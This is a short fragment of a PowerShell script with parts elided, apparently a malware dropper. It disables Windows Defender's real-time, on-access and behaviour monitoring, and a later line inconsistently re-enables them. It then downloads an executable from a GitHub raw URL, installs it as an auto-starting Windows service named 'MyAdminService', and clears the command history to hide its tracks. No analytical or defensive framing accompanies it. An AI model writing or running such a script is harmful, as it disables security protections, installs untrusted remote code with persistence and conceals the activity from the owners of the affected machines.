...
Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction SilentlyContinue;Set-MpPreference -DisableOnAccessProtection $true -ErrorAction SilentlyContinue;Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
...
Set-MpPreference -DisableBehaviorMonitoring $false -ErrorAction SilentlyContinue;Set-MpPreference -DisableOnAccessProtection $false -ErrorAction SilentlyContinue;Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "https://github.com/esquery/eq/raw/refs/heads/main/mspsrv.exe" -OutFile $fullpath
Start-Sleep -Seconds 1
sc.exe create MyAdminService binPath= "C:\ProgramData\orkide\mspsrv.exe" start= auto
Start-Sleep -Seconds 1
Clear-History
exit
